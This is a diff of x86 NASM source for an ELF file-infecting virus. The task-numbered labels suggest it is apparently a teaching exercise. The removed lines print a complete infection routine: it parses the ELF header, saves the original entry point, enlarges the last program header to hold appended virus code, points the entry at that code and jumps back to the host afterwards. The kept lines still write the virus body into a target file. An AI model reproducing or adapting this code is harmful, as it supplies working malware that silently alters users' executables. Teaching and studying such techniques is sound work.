@@ -103,25 +103,6 @@ _start:
     %xdefine %$base 16
     %xdefine %$mag ebp-(%$base+4)
 
-    ; task 1
-    %xdefine %$base 20
-    %xdefine %$exe_code_start_vaddr ebp-(%$base+4)
-
-    ; task 2
-    %xdefine %$base 24
-    %xdefine %$exe_entry_point ebp-(%$base+4)
-    
-    %xdefine %$base (28+ELF_HEADER_SIZE)
-    %xdefine %$elf_header ebp-%$base
-
-    ; task 3
-    %xdefine %$phoff ebp-(%$base+4)
-    %xdefine %$phnum ebp-(%$base+8)
-    %xdefine %$last_ph_offset ebp-(%$base+12)
-
-    %xdefine %$base (40+ELF_HEADER_SIZE+PHDR_SIZE)
-    %xdefine %$ph ebp-%$base
-
     .print_msg:
     get_lbl_loc [%$loc], OutStr
     write stdout, [%$loc], OutStr_len
@@ -171,76 +152,8 @@ _start:
     get_lbl_loc [%$loc], virus_start
     write [%$fd], [%$loc], CODE_SIZE
 
-    .read_elf_header:
-    seek_to_start [%$fd]
-    lea_stack_var [%$p_stack_var], [%$elf_header]
-    read [%$fd], [%$p_stack_var], ELF_HEADER_SIZE
-
-    .save_original_entry_point:
-    mov eax, dword [%$elf_header+ENTRY]
-    mov dword [%$exe_entry_point], eax
-
-    .write_previous_entry_point:
-    lseek [%$fd], -4, SEEK_END
-    lea_stack_var [%$p_stack_var], [%$exe_entry_point]
-    write [%$fd], [%$p_stack_var], 4
-
-    .read_elf_ph_info:
-    movzx eax, word [%$elf_header+EHDR_phnum]
-    mov dword [%$phnum], eax
-    mov eax, dword [%$elf_header+EHDR_phoff]
-    mov dword [%$phoff], eax
-
-    .calc_last_ph_offset:
-    mov eax, [%$phnum]
-    dec eax
-    mov ebx, PHDR_SIZE
-    mul ebx
-    mov ebx, [%$phoff]
-    add eax, ebx
-    mov dword [%$last_ph_offset], eax
-    
-    .read_last_ph:
-    lseek [%$fd], [%$last_ph_offset], SEEK_SET
-    lea_stack_var [%$p_stack_var], [%$ph]
-    read [%$fd], [%$p_stack_var], PHDR_SIZE
-
-    .set_last_ph_sizes:
-    mov eax, 0
-    add eax, dword [%$fsz]
-    sub eax, dword [%$ph+PHDR_offset]
-    add eax, dword CODE_SIZE
-    mov dword [%$ph+PHDR_filesize], eax
-    mov dword [%$ph+PHDR_memsize], eax
-
-    .write_last_ph_back:
-    lseek [%$fd], [%$last_ph_offset], SEEK_SET
-    lea_stack_var [%$p_stack_var], [%$ph]
-    write [%$fd], [%$p_stack_var], PHDR_SIZE
-
-    .read_base_address:
-    mov eax, dword [%$ph+PHDR_vaddr]
-    sub eax, dword [%$ph+PHDR_offset]
-    mov dword [%$exe_code_start_vaddr], eax
-
-    .set_new_entry_point:
-    mov eax, 0
-    add eax, dword [%$exe_code_start_vaddr]
-    add eax, dword [%$fsz]
-    add eax, dword CODE_START_OFFSET
-    mov dword [%$elf_header+ENTRY], eax
-
-    .write_elf_header_back_to_file:
-    seek_to_start [%$fd]
-    lea_stack_var [%$p_stack_var], [%$elf_header]
-    write [%$fd], [%$p_stack_var], ELF_HEADER_SIZE
-
     .close_file:
     close [%$fd]
-
-    .jump_to_previous_entry_point:
-    get_lbl_loc PreviousEntryPoint
-    jmp [p_anchor]
 
 VirusExit:
        exit 0 ; Termination if all is OK and no previous code to jump to
@@ -258,3 +171,4 @@ PreviousEntryPoint: dd VirusExit
 virus_end:
 
 %pop
+
